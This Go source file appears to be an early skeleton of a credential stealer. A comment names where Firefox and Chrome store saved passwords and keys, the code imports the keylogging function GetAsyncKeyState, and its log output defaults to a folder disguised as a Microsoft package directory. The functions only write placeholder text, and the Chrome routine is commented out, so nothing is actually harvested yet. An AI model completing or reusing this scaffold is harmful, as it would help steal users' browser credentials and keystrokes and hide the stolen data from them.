package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"strconv"
	"strings"
	"syscall"
)

/*
Firefox stuff:
%UserProfile%\AppData\Roaming\Mozilla\Firefox\Profiles\profilename\key4.db
%UserProfile%\AppData\Roaming\Mozilla\Firefox\Profiles\profilename\logins.json

Chrome stuff:
%UserProfile%\AppData\Local\Google\Chrome\User Data\Local State
*/

var (
	dll, _    = syscall.LoadDLL("user32.dll")
	proc, _   = dll.FindProc("GetAsyncKeyState")
	interval  = flag.Int("interval", 16, "a time value elapses each frame in millisecond")
	directory = flag.String("directory", getAppData(), "path/to/dir to save key log")
)

func main() {
	defer dll.Release()

	flag.Parse()
	// create directory path
	dir := strings.Replace(*directory, "\\", "/", -1)
	if !strings.HasSuffix(dir, "/") {
		if dir == "" {
			dir = "./"
		} else {
			dir += "/"
		}
	}
	// create directory if not exist
	if !isExist(dir) {
		err := os.MkdirAll(dir, 0777)
		if err != nil {
			log.Fatal("cannot create directory")
		}
	}

	//getChrome(dir)
	getFirefox(dir)
}

func hErr(err error) {
	if err != nil {
		log.Println(err)
	}
}

func getAppData() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	app := usr.HomeDir + "\\AppData\\Local\\Packages\\Microsoft.CredCache_8wekyb3d8bbwe"
	return app
}

func isExist(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

/*func getChrome(dir string) {
	// search cuurent log number
	number := 0
	for isExist(dir + "CR_" + strconv.Itoa(number) + ".log") {
		number++
	}
	// set output log file
	file := dir + "CR_" + strconv.Itoa(number) + ".log"
	lg, err := os.OpenFile(file, os.O_WRONLY|os.O_CREATE, 0777)
	if err != nil {
		log.Fatal("error opening file :", err.Error())
	}
	defer lg.Close()
	log.SetOutput(lg)
	// enter main loop
	data := "The output for Chrome this lol"
	f, err := os.Open(file)
	hErr(err)
	fi, err := f.Stat()
	hErr(err)
	fmt.Println(fi.Size())
	log.Println("\n" + data)
	f.Close()
}*/

func getFirefox(dir string) {
	// search cuurent log number
	number := 0
	for isExist(dir + "Creds_" + strconv.Itoa(number) + ".log") {
		number++
	}
	// set output log file
	file := dir + "Creds_" + strconv.Itoa(number) + ".log"
	lg, err := os.OpenFile(file, os.O_WRONLY|os.O_CREATE, 0777)
	if err != nil {
		log.Fatal("error opening file :", err.Error())
	}
	defer lg.Close()
	log.SetOutput(lg)
	// enter main loop
	data1 := "The output for Chrome this lol"
	data2 := "The output for Firefox this lol"
	f, err := os.Open(file)
	hErr(err)
	fi, err := f.Stat()
	hErr(err)
	fmt.Println(fi.Size())
	log.Println("\n" + data1)
	log.Println("\n" + data2)
	f.Close()
}
